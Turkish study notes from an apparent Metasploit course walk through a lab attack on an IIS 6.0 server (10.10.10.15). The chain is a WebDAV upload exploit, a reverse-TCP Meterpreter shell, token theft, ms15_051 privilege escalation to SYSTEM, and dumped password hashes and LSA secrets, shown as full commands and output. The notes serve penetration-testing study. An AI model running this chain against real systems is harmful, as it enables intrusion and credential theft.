Örneğin, belirli bir port altında aktif bir exploit çalıştırıyorsak ve bu porta farklı bir modül için ihtiyacımız varsa, `[CTRL] + [C]` kullanarak oturumu sonlandıramayız. Bunu yaparsak, portun hala kullanımda olacağını ve yeni modülü kullanımımızı etkileyeceğini görürüz. Bunun yerine, arka planda çalışan aktif görevlere bakmak ve portu boşaltmak için eskilerini sonlandırmak için `jobs` komutunu kullanmamız gerekir.  

Oturumların içindeki diğer görev türleri de, oturum ölse ya da kaybolsa bile arka planda sorunsuzca çalışacak job'lara dönüştürülebilir.

Bu durumda _jobs_ komutu, arka planda çalışan görevleri yönetmek için kullanılır. Örneğin, diyelim ki belirli bir hedefte 4444 portu üzerinden bir exploit çalıştırıyorsunuz ve o sırada aynı portu başka bir modül için kullanmak istiyorsunuz. Eğer bu oturumu [CTRL] + [C] ile kapatırsanız, port 4444 hâlâ kullanımda kalacak ve yeni modül bu porta erişemeyecektir. İşte burada _jobs_ komutu devreye girer: arka planda çalışan görevi sonlandırarak portu boşaltabilir ve ardından yeni modül için kullanabilirsiniz.

```shell-session
msf6 exploit(multi/handler) > jobs -h
Usage: jobs [options]

Active job manipulation and interaction.

OPTIONS:

    -K        Terminate all running jobs.
    -P        Persist all running jobs on restart.
    -S <opt>  Row search filter.
    -h        Help banner.
    -i <opt>  Lists detailed information about a running job.
    -k <opt>  Terminate jobs by job ID and/or range.
    -l        List all running jobs.
    -p <opt>  Add persistence to job by job ID
    -v        Print more detailed info.  Use with -i and -l
```

İlk olarak, port 4444 kullanarak bir modülü çalıştırıyorsunuz:
![Pasted image 20241027173438.png](/img/user/resimler/Pasted%20image%2020241027173438.png)

`-j` parametresi, process'i arka planda bir job olarak çalıştırır.

Şimdi, aynı port 4444’e ihtiyaç duyan başka bir exploit kullanmak istiyorsunuz. Önce, portu boşaltmak için mevcut job'ları görüntüleyin:

![Pasted image 20241027173503.png](/img/user/resimler/Pasted%20image%2020241027173503.png)
Bu komut, arka planda çalışan tüm job’ları listeler.


Portu boşaltmak için önceki job'u sonlandırın:
![Pasted image 20241027173517.png](/img/user/resimler/Pasted%20image%2020241027173517.png)

`[job_id]`, jobs komutundan elde ettiğiniz iş numarasıdır. Bu, 4444 portunu boşaltacak ve yeni modülü bu porta bağlamanızı sağlayacaktır.


#### **Exploit Komutu Yardım Menüsünü Görüntüleme**  

Bir exploit çalıştırdığımızda, `exploit -j` yazarak onu bir job olarak çalıştırabiliriz `.` `exploit` komutunun yardım menüsüne göre, komutumuza `-j` eklemek. Sadece `exploit` veya `run` yerine , “bir iş bağlamında çalıştıracaktır.”

```shell-session
msf6 exploit(multi/handler) > exploit -h
Usage: exploit [options]

Launches an exploitation attempt.

OPTIONS:

    -J        Force running in the foreground, even if passive.
    -e <opt>  The payload encoder to use.  If none is specified, ENCODER is used.
    -f        Force the exploit to run regardless of the value of MinimumRank.
    -h        Help banner.
    -j        Run in the context of a job.
	
<SNIP
```


#### **Bir Exploit'i Bir Background Job Olarak Çalıştırma**
```shell-session
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444
```

#### **Çalışan Jobs Listeleme**  

Çalışan tüm işleri listelemek için jobs `-l` komutunu kullanabiliriz. Belirli bir işi öldürmek için işin dizin numarasına bakın ve `kill [dizin no.]` komutunu kullanın `.` Çalışan tüm işleri öldürmek için `jobs -K` komutunu kullanın.

```shell-session
msf6 exploit(multi/handler) > jobs -l

Jobs
====

 Id  Name                    Payload                    Payload opts
 --  ----                    -------                    ------------
 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
```

Sırada, son derece güçlü `Meterpreter` payload'u ile çalışacağız.


Hedefte, HTML kaynak koduna bakarak bulabileceğimiz belirli bir web uygulaması çalışıyor. Bu web uygulamasının adı nedir?

MSF'de mevcut exploiti bulun ve hedef üzerinde bir shell elde etmek için kullanın. Shell elde ettiğiniz kullanıcının kullanıcı adı nedir?

Hedef sistemde Sudo'nun eski bir sürümü çalışıyor. İlgili exploiti bulun ve hedef sisteme root erişimi elde edin. Flag.txt dosyasını bulun ve içeriğini cevap olarak gönderin.


Çözüm : Nmap ile zafiyetli uygulamanın ismi bulundu. Msfconsoleda tespit edilim shell alındı. Shell'e geçilip sudonun versioyunu tespit edilim google'dan arandı ve uygun bir CVE bulundu CVE search edilde msfconsoledan ve LHOST ve session set ederek çalıştırıldı ve yetki yükseltildi . 


# Meterpreter
`Meterpreter` Payload, kurban host ile bağlantının istikrarlı olmasını sağlamak için `DLL enjeksiyonunu` kullanan ve basit kontroller kullanılarak tespit edilmesi zor olan ve yeniden başlatmalar veya sistem değişiklikleri boyunca kalıcı olacak şekilde yapılandırılabilen çok yönlü, genişletilebilir Payload'un özel bir türüdür. Ayrıca, Meterpreter tamamen uzak hostun belleğinde bulunur ve sabit diskte hiçbir iz bırakmaz, bu da geleneksel adli tekniklerle tespit edilmesini zorlaştırır.

Çeşitli ayrıcalık yükseltme teknikleri, AV kaçınma teknikleri, daha fazla güvenlik açığı araştırması, kalıcı erişim sağlama, pivot vb. bulmamıza yardımcı olabilir.

Bazı ilginç okumalar için Meterpreter stageless payloads hakkındaki bu [yazıya](https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/) ve Metasploit şablonlarının kaçınma için değiştirilmesi hakkındaki bu [yazıya](https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion) göz atın. Bu konular bu modülün kapsamı dışındadır, ancak bu olasılıkların farkında olmalıyız.

Exploit tamamlandığında aşağıdaki olaylar gerçekleşir:  

- Hedef, başlangıç stager'ını çalıştırır. Bu genellikle bir bind, reverse, findtag, passivex vb.dir.  
    
- Stager, Reflective ön ekli DLL'yi yükler. Reflective stub, DLL'nin yüklenmesini/enjeksiyonunu yönetir.  
    
- Meterpreter çekirdeği başlatılır, soket üzerinden AES şifreli bir bağlantı kurar ve bir GET gönderir. Metasploit bu GET'i alır ve istemciyi yapılandırır.  
    
- Son olarak, Meterpreter uzantıları yükler. Her zaman `stdapi` 'yi yükler ve modül yönetici hakları veriyorsa `priv` 'i yükler. Tüm bu uzantılar AES şifrelemesi üzerinden yüklenir.

Meterpreter kabuğunun neler yapabildiğini görmek için hemen `help` komutunu verebiliriz.

#### MSF - Meterpreter Commands

```shell-session
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel
```

Bu komutlardan bazıları referans için modül cheat sheet'inde de mevcuttur.
Meterpreter hakkında edinmemiz gereken ana fikir, hedef işletim sisteminde doğrudan bir shell elde etmek kadar iyi olduğu, ancak daha fazla işlevselliğe sahip olduğudur. Meterpreter geliştiricileri, projenin gelecekte kullanılabilirlik açısından hızla yükselmesi için net tasarım hedefleri belirlediler. Meterpreter'ın şöyle olması gerekiyor:

- Gizli  
- Güçlü  
- Genişletilebilir

## **Gizli**  

Meterpreter başlatıldığında ve hedefe ulaştıktan sonra tamamen bellekte kalır ve diske hiçbir şey yazmaz. Meterpreter kendisini tehlikeye atılmış bir prosese enjekte ettiği için yeni prosesler de yaratılmaz. Dahası, çalışan bir process'ten diğerine process geçişleri gerçekleştirebilir.  

Şimdi güncellenen msfconsole-v6 ile, hedef ana bilgisayar ile aramızdaki tüm Meterpreter yük iletişimleri, veri iletişimlerinin gizliliğini ve bütünlüğünü sağlamak için AES kullanılarak şifrelenir.  

Tüm bunlar sınırlı adli kanıt bulunmasını ve ayrıca kurban makine üzerinde çok az etki yaratılmasını sağlar.


## **Güçlü**  

Meterpreter'ın hedef host ile saldırgan arasında kanalize bir iletişim sistemi kullanması çok faydalı olmaktadır. Bunu, Meterpreter aşamamızın içinde özel bir kanal açarak hemen bir ana bilgisayar-OS kabuğu oluşturduğumuzda ilk elden fark edebiliriz. Bu aynı zamanda AES şifreli trafiğin kullanılmasına da olanak tanır.


## **Genişletilebilir**  

Meterpreter'ın özellikleri çalışma zamanında sürekli olarak artırılabilir ve ağ üzerinden yüklenebilir. Modüler yapısı, yeniden inşa edilmeden yeni işlevlerin eklenmesine de olanak tanır.


#### MSF - Scanning Target

```shell-session
msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15

[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 09:55 UTC
[*] Nmap: Nmap scan report for 10.10.10.15
[*] Nmap: Host is up (0.021s latency).
[*] Nmap: Not shown: 65534 filtered ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/tcp open  http    Microsoft IIS httpd 6.0
[*] Nmap: | http-methods:
[*] Nmap: |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
[*] Nmap: |_http-server-header: Microsoft-IIS/6.0
[*] Nmap: |_http-title: Under Construction
[*] Nmap: | http-webdav-scan:
[*] Nmap: |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
[*] Nmap: |   WebDAV type: Unknown
[*] Nmap: |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
[*] Nmap: |   Server Date: Thu, 03 Sep 2020 09:56:46 GMT
[*] Nmap: |_  Server Type: Microsoft-IIS/6.0
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 59.74 seconds


msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.15             Unknown                    device         


msf6 > services

Services
========

host         port  proto  name  state  info
----         ----  -----  ----  -----  ----
10.10.10.15  80    tcp    http  open   Microsoft IIS httpd 6.0
```

Ardından, bu kutuda çalışan hizmetler hakkında bazı bilgilere bakıyoruz. Özellikle, 80 numaralı portu ve burada ne tür bir web hizmetinin barındırıldığını keşfetmek istiyoruz.

![Pasted image 20241027183658.png](/img/user/resimler/Pasted%20image%2020241027183658.png)

Bunun yapım aşamasında bir web sitesi olduğunu fark ediyoruz - burada web ile ilgili hiçbir şey göremiyoruz. Ancak, hem web sayfasının sonuna hem de Nmap taramasının sonucuna daha yakından baktığımızda, sunucunun `Microsoft IIS httpd 6.0` çalıştırdığını fark ediyoruz. Bu yüzden araştırmamızı bu yönde ilerleterek IIS'nin bu sürümü için yaygın güvenlik açıklarını araştırıyoruz. Biraz arama yaptıktan sonra, yaygın bir güvenlik açığı için aşağıdaki işaretleyiciyi buluyoruz: `CVE-2017-7269`. Ayrıca bunun için geliştirilmiş bir Metasploit modülü de var.


#### MSF - Searching for Exploit

```shell-session
msf6 > search iis_webdav_upload_asp

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/windows/iis/iis_webdav_upload_asp  2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution


msf6 > use 0

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp


msf6 exploit(windows/iis/iis_webdav_upload_asp) > show options

Module options (exploit/windows/iis/iis_webdav_upload_asp):

   Name          Current Setting        Required  Description
   ----          ---------------        --------  -----------
   HttpPassword                         no        The HTTP password to specify for authentication
   HttpUsername                         no        The HTTP username to specify for authentication
   METHOD        move                   yes       Move or copy the file on the remote system from .txt -> .asp (Accepted: move, copy)
   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80                     yes       The target port (TCP)
   SSL           false                  no        Negotiate SSL/TLS for outgoing connections
   VHOST                                no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.239.181   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```


#### MSF - Configuring Exploit & Payload

```shell-session
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15

RHOST => 10.10.10.15


msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0

LHOST => tun0


msf6 exploit(windows/iis/iis_webdav_upload_asp) > run

[*] Started reverse TCP handler on 10.10.14.26:4444 
[*] Checking /metasploit28857905.asp
[*] Uploading 612435 bytes to /metasploit28857905.txt...
[*] Moving /metasploit28857905.txt to /metasploit28857905.asp...
[*] Executing /metasploit28857905.asp...
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Deleting /metasploit28857905.asp (this doesn't always work)...
[!] Deletion failed on /metasploit28857905.asp [403 Forbidden]
[*] Meterpreter session 1 opened (10.10.14.26:4444 -> 10.10.10.15:1030) at 2020-09-03 10:10:21 +0000

meterpreter > 
```

Meterpreter shell'imiz var. Ancak, yukarıdaki çıktıya yakından bakın. Şu anda hedef sistemde `metasploit28857905` adında bir `.asp` dosyasının bulunduğunu görebiliriz. Meterpreter shell elde edildiğinde, daha önce de belirtildiği gibi, bellekte bulunacaktır. Bu nedenle, dosyaya ihtiyaç yoktur ve erişim izinleri nedeniyle başarısız olan `msfconsole` tarafından kaldırılmaya çalışılmıştır. Bu gibi izler bırakmak saldırgan için faydalı değildir ve büyük bir sorumluluk yaratır.  

Sistem yöneticisinin bakış açısına göre, bu ad türüyle veya küçük varyasyonlarıyla eşleşen dosyaları bulmak, bir saldırıyı izlerinin ortasında durdurmak için yararlı olabilir. Yukarıdaki gibi dosya adlarına veya imzalara karşı regex eşleşmelerini hedeflemek, bir saldırganın doğru yapılandırılmış güvenlik önlemleri tarafından kesilmeden önce bir Meterpreter shell oluşturmasına bile izin vermeyecektir.  

İstismarlarımıza devam ediyoruz. Hangi kullanıcı üzerinde çalıştığımızı görmeye çalıştığımızda erişim reddedildi mesajı alıyoruz. Prosesimizi daha fazla ayrıcalığa sahip bir kullanıcıya geçirmeyi denemeliyiz.


#### MSF - Meterpreter Migration

```shell-session
meterpreter > getuid

[-] 1055: Operation failed: Access is denied.


meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 216   1080  cidaemon.exe                                                    
 272   4     smss.exe                                                        
 292   1080  cidaemon.exe                                                    
<...SNIP...>

 1712  396   alg.exe                                                         
 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1920  396   dllhost.exe                                                     
 2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe
 2312  592   wmiprvse.exe                                                    
 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 4076  1080  cidaemon.exe                                                    


meterpreter > steal_token 1836

Stolen token with username: NT AUTHORITY\NETWORK SERVICE


meterpreter > getuid

Server username: NT AUTHORITY\NETWORK SERVICE
```

`steal_token` komutu, Meterpreter oturumunda başka bir işlemin güvenlik belirteci (token) çalmaya yarayan bir komuttur. Bu, genellikle hedef sistemde daha yüksek yetkilere sahip bir kullanıcı ile etkileşim kurmak için kullanılır.

### Ne Anlama Geliyor?

- **Token**: Bir güvenlik belirteci, bir işlemin sahip olduğu izinleri tanımlar. Yani, bir işlem, bir kullanıcının veya grup için belirli yetkilere sahipse, bu işlem o yetkileri kullanarak diğer işlemleri yönetebilir.
- **Steal Token**: `steal_token <pid>` komutu ile belirtilen PID (Process ID) numarasına sahip olan işlemin güvenlik belirtecini alarak, o işlemin yetkilerine sahip olmayı sağlar.

Artık sistemde en azından bir ayrıcalık seviyesi oluşturduğumuza göre, bu ayrıcalığı yükseltmenin zamanı geldi. Bu yüzden etrafta ilginç bir şeyler arıyoruz ve `C:\Inetpub\` konumunda `AdminScripts` adında ilginç bir klasör buluyoruz. Ancak, ne yazık ki, içinde ne olduğunu okuma iznimiz yok.

#### **MSF - Hedef ile Etkileşim**

```cmd-session
c:\Inetpub>dir

dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of c:\Inetpub

04/12/2017  05:17 PM    <DIR>          .
04/12/2017  05:17 PM    <DIR>          ..
04/12/2017  05:16 PM    <DIR>          AdminScripts
09/03/2020  01:10 PM    <DIR>          wwwroot
               0 File(s)              0 bytes
               4 Dir(s)  18,125,160,448 bytes free


c:\Inetpub>cd AdminScripts

cd AdminScripts
Access is denied.
```

Lokal exploit suggester modülünü o anda aktif olan Meterpreter oturumuna bağlayarak çalıştırmaya kolayca karar verebiliriz. Bunu yapmak için, mevcut Meterpreter oturumunu arka plana alırız, ihtiyacımız olan modülü ararız ve SESSION seçeneğini Meterpreter oturumunun dizin numarasına ayarlayarak modülü ona bağlarız.

#### MSF - Session Handling

`local_exploit_suggester`, Metasploit Framework içinde bulunan bir modüldür ve mevcut bir Meterpreter oturumu üzerinden hedef sistemdeki potansiyel yerel güvenlik açıklarını tespit etmek için kullanılır. İşte bu modülün ne işe yaradığını ve nasıl çalıştığını kısaca açıklayalım:

### Ne İşe Yarar?

1. **Güvenlik Açığı Tespiti**: Hedef sistemde yüklü olan yazılımları ve sürümlerini kontrol ederek, bilinen güvenlik açıklarıyla eşleşen yerel exploitleri önerir.
    
2. **Kolay Kullanım**: Sadece bir Meterpreter oturumuyla çalışarak, sistemdeki mevcut güvenlik açıklarını bulmak için karmaşık bir araştırma yapmanıza gerek kalmadan otomatik olarak öneriler sunar.
    
3. **Exploit Listesi**: Hedef sistemdeki yazılım ve sürümlerine göre hangi exploitlerin kullanılabileceği konusunda bilgi verir, bu da pentester'ların daha hızlı hareket etmesine olanak tanır.


```shell-session
meterpreter > bg

Background session 1? [y/N]  y


msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1

SESSION => 1


msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 34 exploit checks are being tried...
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) > 
```

Recon modülünü çalıştırmak bize çok sayıda seçenek sunar. Her birini tek tek incelediğimizde, başarılı olduğunu kanıtlayan `ms15_051_client_copy_image` girişine ulaşıyoruz. Bu istismar bizi doğrudan bir root shell'ine götürerek hedef sistem üzerinde tam kontrol sahibi olmamızı sağlıyor.


#### MSF - Privilege Escalation
```shell-session
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_images

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp


msf6 exploit(windows/local/ms15_051_client_copy_image) > show options

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     46.101.239.181   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1

session => 1


msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0

LHOST => tun0


msf6 exploit(windows/local/ms15_051_client_copy_image) > run

[*] Started reverse TCP handler on 10.10.14.26:4444 
[*] Launching notepad to host the exploit...
[+] Process 844 launched.
[*] Reflectively injecting the exploit DLL into 844...
[*] Injecting exploit into 844...
[*] Exploit injected. Injecting payload into 844...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.14.26:4444 -> 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

Buradan, Meterpreter fonksiyonlarının bolluğunu kullanmaya devam edebiliriz. Örneğin, hash çıkarma, istediğimiz herhangi bir işlemi taklit etme ve diğerleri.

#### MSF - Dumping Hashes
```shell-session
meterpreter > hashdump

Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::
IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::
Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::


meterpreter > lsa_dump_sam

[+] Running as SYSTEM
[*] Dumping SAM
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
Local SID : S-1-5-21-1709780765-3897210020-3926566182

SAMKey : 37ceb48682ea1b0197c7ab294ec405fe

RID  : 000001f4 (500)
User : Administrator
  Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf
  Hash NTLM: d6908f022af0373e9e21b8a241c86dca

RID  : 000001f5 (501)
User : Guest

RID  : 000003e9 (1001)
User : SUPPORT_388945a0
  Hash NTLM: 8ed3993efb4e6476e4f75caebeca93e6

RID  : 000003eb (1003)
User : IUSR_GRANPA
  Hash LM  : a274b4532c9ca5cdf684351fab962e86
  Hash NTLM: 6a981cb5e038b2d8b713743a50d89c88

RID  : 000003ec (1004)
User : IWAM_GRANPA
  Hash LM  : 95d112c4da2348b599183ac6b1d67840
  Hash NTLM: a97f39734c21b3f6155ded7821d04d16

RID  : 000003ef (1007)
User : ASPNET
  Hash LM  : 3f71d62ec68a06a39721cb3f54f04a3b
  Hash NTLM: edc0d5506804653f58964a2376bbd769

RID  : 000003f1 (1009)
User : Lakis
  Hash LM  : f927b0679b3cc0e192410d9b0b40873c
  Hash NTLM: 3064b6fc432033870c6730228af7867c
```

`hashdump`, Meterpreter oturumunda hedef sistemdeki kullanıcı hesaplarının parolalarının hash'lerini çıkarmak için kullanılan bir komuttur ve bu hash'ler, offline kırma işlemleri için kullanılabilir. `lsa_dump_sam` ise, Local Security Authority (LSA) üzerinden kullanıcı bilgilerini ve parolaların hash'lerini elde eden bir komuttur ve genellikle daha fazla ayrıntı sunarak güvenlik politikaları hakkında bilgi sağlar. Temel farkları, `hashdump`'un sadece SAM veritabanından hash'leri alması iken, `lsa_dump_sam`'ın daha kapsamlı güvenlik bilgileri ve hesap durumları ile birlikte daha güvenilir veriler sağlamasıdır.


#### MSF - Meterpreter LSA Secrets Dump
```shell-session
meterpreter > lsa_dump_secrets

[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb

Local name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )
Domain name : HTB

Policy subsystem is : 1.7
LSA Key : ada60ee248094ce782807afae1711b2c

Secret  : aspnet_WP_PASSWORD
cur/text: Q5C'181g16D'=F

Secret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRV
cur/hex : e9 1c c7 89 aa 02 92 49 84 58 a4 26 8c 7b 1e c2 

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 49 2b 31 e7 9a 48 4f 9c b3 10 fc fd 35 bd d7 d5 90 16 5f fc 63 
    full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63
    m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63

Secret  : L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75
cur/hex : 52 53 41 32 48 00 00 00 00 02 00 00 3f 00 00 00 01 00 01 00 b3 ec 6b 48 4c ce e5 48 f1 cf 87 4f e5 21 00 39 0c 35 87 88 f2 51 41 e2 2a e0 01 83 a4 27 92 b5 30 12 aa 70 08 24 7c 0e de f7 b0 22 69 1e 70 97 6e 97 61 d9 9f 8c 13 fd 84 dd 75 37 35 61 89 c8 00 00 00 00 00 00 00 00 97 a5 33 32 1b ca 65 54 8e 68 81 fe 46 d5 74 e8 f0 41 72 bd c6 1e 92 78 79 28 ca 33 10 ff 86 f0 00 00 00 00 45 6d d9 8a 7b 14 2d 53 bf aa f2 07 a1 20 29 b7 0b ac 1c c4 63 a4 41 1c 64 1f 41 57 17 d1 6f d5 00 00 00 00 59 5b 8e 14 87 5f a4 bc 6d 8b d4 a9 44 6f 74 21 c3 bd 8f c5 4b a3 81 30 1a f6 e3 71 10 94 39 52 00 00 00 00 9d 21 af 8c fe 8f 9c 56 89 a6 f4 33 f0 5a 54 e2 21 77 c2 f4 5c 33 42 d8 6a d6 a5 bb 96 ef df 3d 00 00 00 00 8c fa 52 cb da c7 10 71 10 ad 7f b6 7d fb dc 47 40 b2 0b d9 6a ff 25 bc 5f 7f ae 7b 2b b7 4c c4 00 00 00 00 89 ed 35 0b 84 4b 2a 42 70 f6 51 ab ec 76 69 23 57 e3 8f 1b c3 b1 99 9e 31 09 1d 8c 38 0d e7 99 57 36 35 06 bc 95 c9 0a da 16 14 34 08 f0 8e 9a 08 b9 67 8c 09 94 f7 22 2e 29 5a 10 12 8f 35 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

Secret  : L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588
cur/hex : 00 f2 d1 31 e2 11 d3 01 

Secret  : L$TermServLiceningSignKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L$TermServLicensingExchKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L$TermServLicensingServerId-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L$TermServLicensingStatus-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L${6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A}
cur/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e ee da a8 bb f6 1a b1 f4 03 cf 7a f1 7f 4c bc fc b4 84 36 40 6a 34 f9 89 56 aa f4 43 ef 85 58 38 3b a8 34 f0 dc c3 7f 
